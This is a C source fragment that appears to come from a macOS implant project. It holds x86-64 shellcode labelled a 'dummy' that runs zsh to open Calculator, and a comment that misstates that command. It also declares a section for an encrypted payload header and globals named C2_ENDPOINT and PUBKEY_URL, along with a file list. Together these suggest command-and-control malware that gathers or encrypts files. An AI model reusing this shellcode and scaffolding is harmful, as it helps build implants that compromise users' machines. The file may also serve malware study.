#include <wisp.h>

/*-------------------------------------------
/// Shellcode dummies
-------------------------------------------*/

#ifdef ARCH_X86
const uint8_t dummy[] = {
    0x48, 0x31, 0xd2,             // xor    rdx, rdx
    0x52,                         // push   rdx
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a, 0x73, 0x68,  // mov    rbx, '/bin/zsh'
    0x53,                         // push   rbx
    0x48, 0x89, 0xe7,             // mov    rdi, rsp 
    0x48, 0x31, 0xc0,             // xor    rax, rax
    0x66, 0xb8, 0x2d, 0x63,       // mov    ax, 0x632d
    0x50,                         // push   rax
    0x48, 0x89, 0xe3,             // mov    rbx, rsp 
    0x52,                         // push   rdx (null)
    0xeb, 0x0f,                   // jmp    0x0f
    0x53,                         // push   rbx
    0x57,                         // push   rdi
    0x48, 0x89, 0xe6,             // mov    rsi, rsp
    0x6a, 0x3b,                   // push   0x3b 
    0x58,                         // pop    rax 
    0x48, 0x0f, 0xba, 0xe8, 0x19, 0x0f, 0x05, // (execve)
    0xe8, 0xec, 0xff, 0xff, 0xff,  
    0x6f, 0x70, 0x65, 0x6e, 0x20, 0x2d, 0x61, 0x20, 
    0x43, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 
    // 0x90, 0x90, 
    0x6f, 0x72, 0x00,       // '/bin/zsh -a calculator'        
    0x52
};
#elif defined(ARCH_ARM)
const uint8_t dummy[] = {
};
#endif

const size_t len = sizeof(dummy);

/* Mach-O header */
extern struct mach_header_64 _mh_execute_header;
__attribute__((used, section("__DATA,__fdata")))
uint8_t data[sizeof(enc_header_t) + PAGE_SIZE + IV_SIZE];

/* Global */
char C2_ENDPOINT[1024];
char PUBKEY_URL[1024];
file_t *files[MAX_FILES];
int fileCount = 0;
char tmpDirectory[256] = {0};
char *_strings[8] = {0};
